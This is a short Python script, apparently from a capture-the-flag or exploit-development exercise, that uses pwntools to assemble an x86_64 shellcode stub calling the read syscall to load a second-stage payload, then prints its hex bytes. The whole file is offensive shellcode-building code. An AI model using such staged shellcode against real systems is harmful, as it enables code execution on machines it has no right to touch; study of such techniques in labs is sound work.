from pwn import *

context.arch = "x86_64"

sh = f'''/* call read(0, 'rsp', 0x100) */
    /* eax er allerede 0 */
    xor al, al
    mov rsi, [rsp + 16]
    add rsi, 54
    add edx, 0x64
    syscall
'''
assembly = asm(sh).hex()

log.info(f"first read: {assembly=}")

for i in range(0,len(assembly),8):
    print(assembly[i:i+2])